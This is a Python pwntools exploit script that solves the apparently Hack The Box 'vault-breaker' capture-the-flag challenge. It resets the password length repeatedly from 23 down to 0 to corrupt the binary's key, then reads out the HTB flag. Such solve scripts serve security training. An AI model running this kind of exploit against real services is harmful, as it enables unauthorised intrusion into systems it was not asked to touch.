#!/usr/bin/env python3

from pwn import context, log, remote, sys

context.binary = 'vault-breaker'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'[*] Length of new password (0-31): ', b'0')
    progress = log.progress('Number')

    for i in range(0x17, -1, -1):
        progress.status(str(i))
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'[*] Length of new password (0-31): ', str(i).encode())

    p.sendlineafter(b'> ', b'2')
    p.recvuntil(b'HTB')
    flag = b'HTB' + p.recvline().strip()
    p.recv()
    p.close()
    print(flag.decode())


if __name__ == '__main__':
    main()
